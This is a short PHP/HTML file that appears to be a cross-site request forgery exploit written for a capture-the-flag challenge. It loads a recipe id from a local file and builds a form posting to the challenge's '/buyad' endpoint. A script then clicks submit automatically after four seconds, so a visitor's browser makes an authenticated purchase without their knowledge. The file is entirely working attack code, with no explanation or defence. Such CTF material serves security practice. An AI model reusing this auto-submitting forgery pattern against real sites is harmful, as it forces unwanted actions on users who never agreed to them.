<?php
 $RECIPEID = file_get_contents('./csrf_recipe_id.txt');
 $VICTIMURL = "http://saffron.challs.teamitaly.eu/buyad";
?>


<form action="<?php echo $VICTIMURL;?>" method="POST">

    <input name="recipeid" type="text" value="<?php echo $RECIPEID;?>" />

    <input name="ad" type="text" value="hello"/>
        

<button type="submit" id="submit">Buy</button>
</form>


<script>
    setTimeout(() => {
        document.getElementById('submit').click()
    }, 4000);
</script>


